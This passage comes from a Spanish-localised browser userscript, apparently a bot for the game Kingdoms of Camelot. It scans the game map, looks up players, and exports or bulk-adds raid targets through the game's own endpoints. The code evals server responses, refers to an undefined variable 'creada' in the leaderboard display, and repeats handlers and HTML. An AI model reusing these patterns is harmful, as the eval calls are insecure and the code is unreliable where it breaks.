			var ScoutList = [];
			for(k=0; k<document.getElementsByName('pbsrcScoutCheck').length; k++){
				if(document.getElementsByName('pbsrcScoutCheck')[k].checked){
					ScoutList.push(document.getElementsByName('pbsrcScoutCheck')[k].value);
				}
			}
			t.doScout(ScoutList, t.scoutcity);
			document.getElementById('pbSrcStartScout').className = 'button20 pbButCancel';
			document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>Parar</span>';
		} else {
			t.scouting = false;
			document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
			document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>Iniciar exploración</span>';
		}
	},
    
  
/** mapdata.userInfo:
(object) u4127810 = [object Object]
    (string) n = George2gh02    (name)
    (string) t = 1              (title code)
    (string) m = 55             (might)
    (string) s = M              (sex)
    (string) w = 2              (mode: 1=normal, 2=begprotect, 3=truce, 4=vacation )
    (string) a = 0              (alliance)
    (string) i = 1              (avatar code)
*****/
  mapCallback : function (uList){
    var t = Tabs.Search;

    var rslt = t.SearchList;
	map = rslt.data;
    var Dip = Seed.allianceDiplomacies;	
    var userInfo = rslt.userInfo;
    var alliance = rslt.allianceNames;
	
    for (k in map){
      if (t.opt.searchType==0 && map[k].tileType==51 && !map[k].tileCityId ) {  // if barb
        type = 0;
      } else if (t.opt.searchType==1 && map[k].tileType>=10 &&  map[k].tileType<=50) { // if wild
        if (map[k].tileType == 10)
          type = 1;
        else if (map[k].tileType == 11)
          type = 2;
        else
          type = (map[k].tileType/10) + 1;
      } else if (t.opt.searchType==2 && map[k].tileCityId>=0 && map[k].tileType>50 && map[k].cityName) {
		    type = 7;
      } else
        continue;
        
      var dist = distance (t.opt.startX, t.opt.startY, map[k].xCoord, map[k].yCoord);
      if ((t.opt.searchShape=='circle' && dist <= t.opt.maxDistance)
      ||  (t.opt.searchShape=='square' && map[k].xCoord>=t.firstX && map[k].xCoord<=t.lastX && map[k].yCoord>=t.firstY && map[k].yCoord<=t.lastY)){
	  	  if (t.opt.searchType==2) {    // if city search
    			var isMisted = map[k].tileUserId == 0 || false;		
    			var uu = 'u'+map[k].tileUserId;
    			var aD = '';
  				var nameU = '';
  				var mightU = '';
  				var aU = '';
    			if (!isMisted && userInfo[uu]) {
    				nameU = userInfo[uu].n;   // can error, must check if (userInfo[uu])
    				mightU = userInfo[uu].m;
    				if (alliance['a'+userInfo[uu].a])
    					aU = alliance['a'+userInfo[uu].a];
    				else
    				  aU = '----';
    				aD = '';
    				if (Dip.friendly && Dip.friendly['a'+userInfo[uu].a]) aD = 'f';
    				if (Dip.hostile && Dip.hostile['a'+userInfo[uu].a]) aD = 'h';
					if (Dip.allianceId && Dip.allianceId==userInfo[uu].a) aD = 'a';
					if (getDiplomacy(userInfo[uu].a) == 'neutral') aD = 'n';
					if (!userInfo[uu].a || userInfo[uu].a==0) aD = 'u';
					
    			}
// TODO: save memory, remove city name ?   			
          t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isMisted, map[k].tileCityId, map[k].tileUserId, map[k].cityName, nameU, mightU, aU, aD, uList.data[map[k].tileUserId]?1:0]);
        } else {
          isOwned = map[k].tileUserId>0 || map[k].misted;
          t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isOwned, (map[k].tileUserId>0? map[k].tileUserId : 0), uList.data[map[k].tileUserId]?1:0]);
        }
        ++t.tilesFound;
      }
    }
    
    t.tilesSearched += (15*15);
    document.getElementById('pastatSearched').innerHTML = 'Buscando: '+ t.tilesSearched;
    t.dispMapTable();

    t.curX += 15;
    if (t.curX > t.lastX){
      t.curX = t.firstX;
      t.curY += 15;
      if (t.curY > t.lastY){
        t.stopSearch ('Hecho!');
        return;
      }
    }
    var x = t.MapAjax.normalize(t.curX);
    var y = t.MapAjax.normalize(t.curY);
    document.getElementById ('pastatStatus').innerHTML = 'Buscando en '+ x +','+ y;
    setTimeout (function(){t.MapAjax.request (x, y, 15, t.eventgetplayeronline)}, MAP_DELAY);
  },
  
  eventgetplayeronline : function (left, top, width, rslt){
	var t = Tabs.Search;
    if (!t.searchRunning)
      return;
    if (!rslt.ok){
      t.stopSearch ('ERROR: '+ rslt.errorMsg);
      return;
    }
	
	map = rslt.data;
	t.SearchList = rslt;
	var uList = [];
	for(k in map){
		if(map[k].tileUserId != null)
			uList.push(map[k].tileUserId);
	}
	t.fetchPlayerStatus (uList, function(r){ t.mapCallback(r)});
  },

  clickedScout : function (x, y){
    unsafeWindow.modal_attack (3, x, y);
    CwaitForElement ('modal_attack', 5000, function (){document.getElementById('modalBox1').style.zIndex='112000'});
  },
    
  clickedLookup : function (pid){
    var t = Tabs.Search;
    var pop = new CPopup ('pbsrclookup', 0,0, 500,500, true);
    if (t.popFirst){
      pop.centerMe (mainPop.getMainDiv());  
      t.popFirst = false;
    }
    pop.getTopDiv().innerHTML = '<CENTER><B>Buscar Jugador</b></center>';
    pop.getMainDiv().innerHTML = '<DIV class=pbStat>Informacion de Clasificación</div><SPAN id=pblupLB>Mirando clasificación...</span>\
      <BR><DIV class=pbStat>Buscando Alianza</div><SPAN id=pblupAI>Viendo Información de Alianza...</span>';
    pop.show (true);
    t.fetchLeaderboard (pid, function (r){t.gotPlayerLeaderboard(r, document.getElementById('pblupLB'))});
    t.fetchPlayerInfo (pid, function (r){t.gotPlayerInfo(r, document.getElementById('pblupAI'))});
  },

  ExportToRaid : function (X,Y){
    var t = Tabs.Search;
    var cityId =t.selectedCity['id'];
    var pop = new CPopup ('pbExportRaid', 0,0, 800,300, true);
    if (t.popFirst){
      pop.centerMe (mainPop.getMainDiv());  
      t.popFirst = false;
    }
    pop.getTopDiv().innerHTML = '<CENTER><B>Exportar a Raid</b></center>';
    
	  var m = '<TABLE id=pbRaidAdd width=100% height=0% class=pbTab><TR align="center">';
	  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
	  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="0"></td></tr>';

	  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
	  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="0"></td></tr>';

	  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
	  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
	  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
	  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="0"></td>';
	  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="0"></td></tr></table>';

	  m += '<BR><CENTER>' +strButton20('Ayuda', 'id=pbHelp')+'<SELECT id=RaidKnights type=list></select></center>';
	  m+= '<BR><CENTER>'+ strButton20('Guardar en Raid', 'id=pbRaidSave') +'</center>';
          
    pop.getMainDiv().innerHTML = m;
    
    t.getKnights();
    
    document.getElementById ('pbHelp').addEventListener ('click', t.helpPop, false);
    document.getElementById ('pbRaidSave').addEventListener ('click', function(){
 	  	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    			  		
    	params.pf = 0;
        params.ctrl = 'BotManager';
    	params.action = 'saveMarch';
    	params.settings = {};
    	params.settings.cityId = cityId;
    	params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};    	
    	params.queue[0].cityMarches.knightId = parseInt(document.getElementById ('RaidKnights').value);
    	params.queue[0].cityMarches.toXCoord = X;
    	params.queue[0].cityMarches.toYCoord = Y;
    	params.queue[0].cityMarches.unit0Count = 0;
    	params.queue[0].cityMarches.unit1Count = parseInt(document.getElementById ('Unit1').value);
    	params.queue[0].cityMarches.unit2Count = parseInt(document.getElementById ('Unit2').value);
    	params.queue[0].cityMarches.unit3Count = parseInt(document.getElementById ('Unit3').value);
    	params.queue[0].cityMarches.unit4Count = parseInt(document.getElementById ('Unit4').value);
    	params.queue[0].cityMarches.unit5Count = parseInt(document.getElementById ('Unit5').value);
    	params.queue[0].cityMarches.unit6Count = parseInt(document.getElementById ('Unit6').value);
    	params.queue[0].cityMarches.unit7Count = parseInt(document.getElementById ('Unit7').value);
    	params.queue[0].cityMarches.unit8Count = parseInt(document.getElementById ('Unit8').value);
    	params.queue[0].cityMarches.unit9Count = parseInt(document.getElementById ('Unit9').value);
    	params.queue[0].cityMarches.unit10Count = parseInt(document.getElementById ('Unit10').value);
    	params.queue[0].cityMarches.unit11Count = parseInt(document.getElementById ('Unit11').value);
    	params.queue[0].cityMarches.unit12Count = parseInt(document.getElementById ('Unit12').value);
    	
    	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
			  		method: "post",
			         parameters: params,
					 loading: true,
					 onSuccess: function(transport){
						var rslt = eval("(" + transport.responseText + ")");
	                      if (rslt.ok) {
	                      		pop.show (false);
								unsafeWindow.cityinfo_army();
	                          setTimeout(unsafeWindow.update_seed_ajax, 250);
						 } else ('Error :' + rslt.msg);
						 
					 },
			 });
    	}, false);
    
    pop.show (true);
  },
  
  
  getKnights : function(){
         var t = Tabs.Search;
         var knt = new Array();
         cityId = t.selectedCity['id'];
         for (k in Seed.knights['city' + cityId]){
         		if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 && Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
         			knt.push ({
         				Name:   Seed.knights['city' + cityId][k]["knightName"],
         				Combat:	parseInt(Seed.knights['city' + cityId][k]["combat"]),
         				ID:		Seed.knights['city' + cityId][k]["knightId"],
         			});
         		}
         }
         knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
         document.getElementById('RaidKnights').options.length=0;
  		var o = document.createElement("option");
  		o.text = '--Cambiar el Caballero--';
  		o.value = 0;
  		document.getElementById("RaidKnights").options.add(o);
         for (k in knt){
      			if (knt[k]["Name"] !=undefined){
  	    			var o = document.createElement("option");
  	    			o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +')')
  	    			o.value = knt[k]["ID"];
  	    			document.getElementById("RaidKnights").options.add(o);
      			}
      	}
      },
  
  
  
  gotPlayerLeaderboard : function (rslt, span){
    var t = Tabs.Search;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    if (rslt.totalResults == 0){
      span.innerHTML = '<B>Clasificación:</b> No encontrada! (¿niebla?)<BR><BR>';
      return;
    }
    var p = rslt.results[0];
    var x;
    var name = '';
    if (p.playerSex == 'M')
      name = 'Lord ';
    else if (p.playerSex == 'F')
      name = 'Lady ';   
    name += p.displayName;      
    if ((x = officerId2String(p.officerType)) != '')  
      name += ' ('+ x + ')';  
    var aName = p.allianceName;
    if (!aName || aName=='')
      aName = 'none';
             
    var m = '<CENTER><SPAN class=boldRed>NOTA: La información clasificatoria puede ser de hasta 24 horas atras</span></center><TABLE class=pbTabSome>';
    m += '<TR><TD class=pbDetLeft>Jugador:</td><TD>'+ name +'</td></tr>\
      <TR><TD class=pbDetLeft>Poderio:</td><TD>'+ p.might +' (rank #'+ p.rank +')</td></tr>\
      <TR><TD class=pbDetLeft>Alianza:</td><TD>'+ aName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
      <TR valign=top><TD class=pbDetLeft>Ciudades:</td><TD><TABLE class=pbTabSome><TR style="font-weight:bold"><TD>Nombre Ciudad</td><TD>Coordenadas</td><TD>Nivel</td><TD>Estado</td><TD>Creada</td></tr>';

    for (var i=0; i<p.cities.length; i++){
      var c = p.cities[i];
      var created = '';
      if (c.dateCreated && c.dateCreated.substr(0,2)=='20')
        created = c.dateCreated.substr(0,10);
      m += '<TR><TD>'+ c.cityName +'</td><TD>'+ coordLink(c.xCoord, c.yCoord) +'</td><TD align=center>'+ c.tileLevel +'</td>\
          <TD>'+ cityStatusString (c.cityStatus) +'</td><TD>'+ creada +'</td></tr>';
    }    
    m += '</table></td></tr></table>';
    span.innerHTML = m;
  },

  gotPlayerInfo : function (rslt, span){
    var t = Tabs.Search;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    var m = '<TABLE class=pbTabSome>';
    var p = rslt.userInfo[0];
    var pids = p.provinceIds.split (',');
    var prov = [];
    for (var i=0; i<pids.length; i++)
      prov.push(unsafeWindow.provincenames['p'+pids[i]]);
    m += '<TR><TD class=pbDetLeft>Jugador:</td><TD>'+ p.genderAndName +'</td></tr>\
      <TR><TD class=pbDetLeft>Poder:</td><TD>'+ p.might +'</td></tr>\
      <TR><TD class=pbDetLeft>Perfil Facebook:</td><TD><A target="_tab" href="http://www.facebook.com/profile.php?id='+ p.fbuid +'">Abrir en otra ventana</a></td></tr>\
      <TR><TD class=pbDetLeft>Alianza:</td><TD>'+ p.allianceName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
      <TR valign=top><TD class=pbDetLeft>Provincias:</td><TD style="white-space:normal">'+ prov.join(', ') +'</td></tr>';
    span.innerHTML = m + '</table>';
  },
      
  fetchPlayerInfo : function (uid, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.uid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserGeneralInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },
  fetchLeaderboard : function (uid, notify) {
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.userId = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify (rslt);
      },
    });
  },
  fetchPlayerStatus : function (uidArray, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.checkArr = uidArray.join(',');
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getOnline.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errorMsg:'AJAX error'});
      },
    });
  },
   
};   // end Search tab




/******** Export to KOC Attack **********/

var exportToKOCattack = {
  troops : {},

  init : function (){
    var t = exportToKOCattack;
    for (var b=1; b<11; b++){
      t.troops['b'+ b] = [];
      for (var trp=0; trp<12; trp++){
        t.troops['b'+ b][trp] = 0;
      }
    }
    var s = GM_getValue ('atkTroops_'+ getServerId(), null);
    if (s != null){
      var trp = JSON2.parse(s);
      for (var b=1; b<11; b++){
        if (trp['b'+ b] && trp['b'+ b].length == 12)
          t.troops['b'+ b] = trp['b'+ b];
      }
    }
    window.addEventListener('unload', t.onUnload, false);
  },

  onUnload : function (){
    var t = exportToKOCattack;
    if (!ResetAll) GM_setValue ('atkTroops_'+ getServerId(),  JSON2.stringify(t.troops));
  },

  doExport : function (coordList, city){
    var t = exportToKOCattack;
    var popExp = null;
    var cList = coordList;
    var curLevel = 0;
    var city = city;
    var troopDef = [
      ['T.Suministro', 1],
      ['Carretas', 9],
      ['Arqueros', 6],
      ['C.Ligera', 7],
      ['C.Pesada', 8],
      ['Ballistas', 10],
    ];

    if (popExp == null){
      popExp = new CPopup ('pbsrcexp', 0,0, 685,600, true, function (){popExp.destroy(); popExp=null;});
      popExp.centerMe (mainPop.getMainDiv());
    }
    var m = '<DIV class=pbStat>Exportar datos a KOC Attack</div><BR><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPadNW>\
      <TR style="font-weight:bold; background-color:white"><TD>Tipo objetivo</td><TD style="padding:1px" align=center><BR>objetivo</td><TD width=15></td>';
    for (var i=0; i<troopDef.length; i++)
      m += '<TD>'+ troopDef[i][0] +'</td>';
    m += '</tr>';
    for (var b=1; b<11; b++){
      m += '<TR><TD>Nivel de Barbaros '+ b +'</td><TD align=right>'+ coordList['lvl'+b].length  +'&nbsp; &nbsp;</td><TD></td>';
      for (var td=0; td<troopDef.length; td++)
        m += '<TD><INPUT id=ptET_'+ b +'_'+ troopDef[td][1] +' type=text size=3 value="'+ t.troops['b'+ b][troopDef[td][1]-1] +'"></td>';
      m += '<TD width=90%><SPAN class=boldRed id=ptETerr_'+ b +'></span></tr>';
    }
    m += '</table>';
    var isKOCattack = !(document.getElementById('KOCAttackToggle') == null);

    //TODO: 'RESET VALUES' button ?

    if (isKOCattack){
      m += '<BR><CENTER>'+ strButton20('Agregar Coordenadas a KOC Attack', 'id=pbSrcDoBA') +'</center>';
    } else {
      m += 'KOC ataque no funciona, no puede exportar';
    }
    m += '<CENTER><DIV style="width:70%" id=pbSrcExpResult></DIV></center>';
    popExp.getMainDiv().innerHTML =  m;
    for (var b=1; b<11; b++)
      for (var td=0; td<troopDef.length; td++)
        document.getElementById('ptET_'+ b +'_'+ troopDef[td][1]).addEventListener ('change', validate, false);

    popExp.getTopDiv().innerHTML = '<CENTER><B>Power Bot Exportando</b></center>';
    if (isKOCattack)
      document.getElementById ('pbSrcDoBA').addEventListener ('click', doBulkAdd, false);
    popExp.show(true);

    if (city != null){
      for (var i=0; i<Cities.numCities; i++)
        if (city.id == Cities.cities[i].id)
          break;
      if (i < Cities.numCities){
        setTimeout (function(){unsafeWindow.citysel_click(document.getElementById('citysel_'+ (i+1)));}, 0);
//logit ("SWITCH CITY: "+ (i+1));
      }
    }
// TODO: WAIT FOR City select ?


    function validate (e){
      var x = e.target.id.substr(5).split('_');
      var b = x[0];
      var trp = x[1];
      document.getElementById('ptETerr_'+ b).innerHTML = '';
      var x = parseIntZero (e.target.value);
      if (isNaN(x) || x<0 || x>150000){
        e.target.style.backgroundColor = 'red';
        document.getElementById('ptETerr_'+ b).innerHTML = 'Entrada no valida';
        return;
      } else {
        e.target.style.backgroundColor = '';
        e.target.value = x;
        t.troops['b'+ b][trp-1] = x;
      }
      var tot = 0;
      for (var td=0; td<troopDef.length; td++)
        tot += parseIntZero(document.getElementById('ptET_'+ b +'_'+ [troopDef[td][1]]).value);
      if (tot<1 && cList['lvl'+ b].length>0 )
        document.getElementById('ptETerr_'+ b).innerHTML = 'No hay tropas definidas';
      if (tot>150000)
        document.getElementById('ptETerr_'+ b).innerHTML = 'Demasiadas tropas';
    }

    function doBulkAdd (){
      for (var b=1; b<11; b++){
        if (document.getElementById('ptETerr_'+ b).innerHTML != '')
          return;
        var tot = 0;
        for (var td=0; td<troopDef.length; td++)
          tot += t.troops['b'+b][troopDef[td][1]-1];
        if (tot<1 && cList['lvl'+ b].length>0){
          document.getElementById('ptETerr_'+ b).innerHTML = 'No hay tropas definidas';
          return;
        } else if (tot>150000) {
          document.getElementById('ptETerr_'+ b).innerHTML = 'Demasiadas tropas';
          return;
        }
      }
      document.getElementById('pbSrcExpResult').innerHTML = '';
      doNextLevel ();
    }

    function endBulkAdd (msg){
      unsafeWindow.Modal.hideModalAll();
      curLevel = 0;
      showMe ();
      popExp.show(true);
      document.getElementById('pbSrcExpResult').innerHTML += msg;
    }

    function doNextLevel (){
      while ( curLevel<10 && cList['lvl'+ ++curLevel].length==0)
        ;
      if (curLevel>=10){
        endBulkAdd ('Hecho!<BR>');
        return;
      }
		e_attackDialog(false);
    }

    function e_attackDialog (tf){
      if (!tf){
          hideMe();
		  popExp.show (false);
		  unsafeWindow.Modal.hideModalAll();
		  unsafeWindow.modal_attack(4,0,0);
		  new CwaitForElement ('BulkAddAttackDiv', 1000, e_attackDialog );
      }
      var div = searchDOM (document.getElementById('BulkAddAttackDiv'), 'node.tagName=="DIV" && node.style.display=="none"', 10);
      if (div==null){
        endBulkAdd ('<SPAN class=boldRed>ERROR: Inesperado formato de dialogo con attack (1).</span>');
        return;
      }
      var ta = searchDOM (div, 'node.tagName=="TEXTAREA"', 10);
      var but = searchDOM (div, 'node.tagName=="A"', 10);
      if (ta==null || but==null){
        endBulkAdd ('<SPAN class=boldRed>ERROR: Inesperado formato de dialogo con attack (2).</span>');
        return;
      }
      for (var trp=1; trp<13; trp++){
          var inp = document.getElementById('modal_attack_unit_ipt' +trp);
          inp.value = t.troops['b'+curLevel][trp-1];
        if (t.troops['b'+curLevel][trp-1] > 0)
		  inp.style.backgroundColor = 'yellow';
        else
          inp.style.backgroundColor = 'white';
	  }
      div.style.display = 'block';
      document.getElementById('KOCAttackBulkAddForce').checked = true;
      if (DISABLE_BULKADD_LIST)
        ta.value = '';
      else {
        var m = '';
        var list = cList['lvl'+ (curLevel)];
        for (i=0; i<list.length; i++)
          m += list[i].x +','+ list[i].y +'\n';
        ta.value = m;
      }
      clickWin (unsafeWindow, but, 'click');
      unsafeWindow.Modal.hideModal();
      document.getElementById('pbSrcExpResult').innerHTML += 'Agregados '+ list.length +' objetivos para '+ city.name +'<BR>';
      setTimeout (doNextLevel, 500);
    }
  },
}


  function searchDOM (node, condition, maxLevel, doMult){
    var found = [];
    eval ('var compFunc = function (node) { return ('+ condition +') }');
    doOne(node, 1);
    if(!doMult){
      if (found.length==0)
        return null;
      return found[0];
    }
    return found;
    function doOne (node, curLevel){
      try {
        if (compFunc(node))
          found.push(node);
      } catch (e){
      }
      if (!doMult && found.length>0)
        return;
      if (++curLevel<maxLevel && node.childNodes!=undefined)
        for (var c=0; c<node.childNodes.length; c++)
          doOne (node.childNodes[c], curLevel);
    }
  }



/****************************  Sample Tab Implementation  ******************************/
Tabs.sample = {
  tabOrder : 30,                    // order to place tab in top bar
  tabLabel : 'Muestra',
  tabDisabled : !ENABLE_SAMPLE_TAB, // if true, tab will not be added or initialized
  tabLabel : 'Click Me',            // label to show in main window tabs
  myDiv : null,
  timer : null,

  init : function (div){    // called once, upon script startup
    var t = Tabs.sample;
    t.myDiv = div;
    var cityName = Cities.cities[0].name;
    div.innerHTML = '<CENTER><BR>Esta es una implementación de muestra<BR><BR>Mostrar alimento para la ciudad '+ cityName +' : <SPAN id=pbSampleFood>0</span>\
        <BR><BR>(El alimento sera actualizado cada 5 sg.)</center>';
  },

  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.sample;
    clearTimeout (t.timer);
  },

  show : function (){         // called whenever this tab is shown
    var t = Tabs.sample;
    var food = parseInt(Seed.resources['city'+ Cities.cities[0].id]['rec'+1][0] / 3600);
    document.getElementById('pbSampleFood').innerHTML = addCommasWhole1 (food);
    clearTimeout (t.timer);
    t.timer = setTimeout (t.show, 5000);
  },
}


/*********************************** ATTACK TAB ***********************************/
function setMaxHeightScrollable (e){
  e.style.height = '100%';
  e.style.height = e.clientHeight + 'px';
  //e.style.maxHeight = e.clientHeight + 'px';
  e.style.overflowY = 'auto';
}

Tabs.Attack = {
  tabDisabled : !ENABLE_ATTACK_TAB,
  tabOrder: 20,
  tabLabel : 'Ataques',
  myDiv : null,
  data : {},
  MapAjax : new CMapAjax(),

  init : function (div){
    var t = Tabs.Attack;
    t.myDiv = div;
    t.myDiv.innerHTML = '<TABLE width=100% height=100% class=pbTab><TR><TD><INPUT id=pbBarbShow type=submit value="Mostrar todos los objetivos" \> <BR>\Ciudad: <SPAN id=pbAtkCSS></span> &nbsp; &nbsp; &nbsp; Radio: <INPUT id=pbBarbDist size=3 type=text> &nbsp; &nbsp; <INPUT id=pbBarbScan type=submit value=Scan \></td></tr><TR><TD height=100%>\
       Ciudad: <SPAN id=pbAtkCSS></span> &nbsp; &nbsp; &nbsp; Radi0: <INPUT id=pbBarbDist size=3 type=text> &nbsp; &nbsp; <INPUT id=pbBarbScan type=submit value=Scan \></td></tr><TR><TD height=100%>\
       <DIV id=pbAtkDiv style="background-color:white"></div></td></tr></table>';
    t.loadTargets ();
    // TODO: Check current cities, invalidate data if city moved
    document.getElementById('pbBarbScan').addEventListener ('click', t.e_clickedScan, false);
    document.getElementById('pbBarbShow').addEventListener ('click', t.e_clickedShow, false);
    new CdispCityPicker ('pbAtkCS', document.getElementById('pbAtkCSS'), false, function (c){t.scanCity=c}, 0);
  },

  hide : function (){
  },

  state : 0,
  show : function (){
    var t = Tabs.Attack;
    if (t.state == 0){
      setMaxHeightScrollable (document.getElementById('pbAtkDiv'));
      t.state = 1;
    }
  },

  clearDiv : function (){
    document.getElementById('pbAtkDiv').innerHTML = '';
  },
  writeDiv : function (m){
    document.getElementById('pbAtkDiv').innerHTML += m;
  },

  loadTargets : function (){
    var t = Tabs.Attack;
DebugTimer.start();
    var totTargets = 0;
    for (var c=0; c<Cities.numCities; c++){
      var s = GM_getValue ('atk_'+ getServerId() +'_'+ Cities.cities[c].id, null);
      if (s == null)
        t.data['city'+ Cities.cities[c].id] = {cityX:Cities.cities[c].x, cityY:Cities.cities[c].y, radius:0, numTargets:0, targets:{}};
      else
        t.data['city'+ Cities.cities[c].id] = JSON2.parse (s);
      totTargets += t.data['city'+ Cities.cities[c].id].numTargets;
    }
DebugTimer.display ('Es hora de GM_getValue() '+ totTargets +' objetivos para todas las ciudades');
  },

  e_clickedScan : function (){
    var t = Tabs.Attack;
    t.clearDiv();
    var dist = parseInt(document.getElementById('pbBarbDist').value);
    if (isNaN(dist) || dist<1 || dist>35){
      t.writeDiv ("<SPAN class=boldRed>Nuh-uh, inténtalo de nuevo</span><BR>");
      return;
    }
    t.writeDiv ('Escaneado el mapa de la ciudad: '+ t.scanCity.name +'<BR>');
    t.scanBarbs (t.scanCity.id, dist);
  },

  popShow : null,

  e_clickedShow : function (){    // show all current attack data
    var t = Tabs.Attack;
    if (t.popShow == null){
      t.popShow = new CPopup ('pbbs', 0,0, 500,500, true, function (){t.popShow.destroy(); t.popShow=null;});
      t.popShow.centerMe (mainPop.getMainDiv());
    }
    var m = '<DIV style="max-height:560px; height:560px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPad>';
    for (var c=0; c<Cities.numCities; c++){
      var dat = t.data['city'+ Cities.cities[c].id];
      m += '<TR><TD colspan=3><DIV class=pbStat>'+ Cities.cities[c].name +' &nbsp; (radio:'+ dat.radius +' &nbsp;targets:'+ dat.numTargets  +')</div></td></tr>';
      // sort by distance ...
      var atks = [];
      for (k in dat.targets)
        atks.push (dat.targets[k]);
      atks.sort (function(a,b){return a.dist-b.dist});
      for (i=0; i<atks.length; i++)
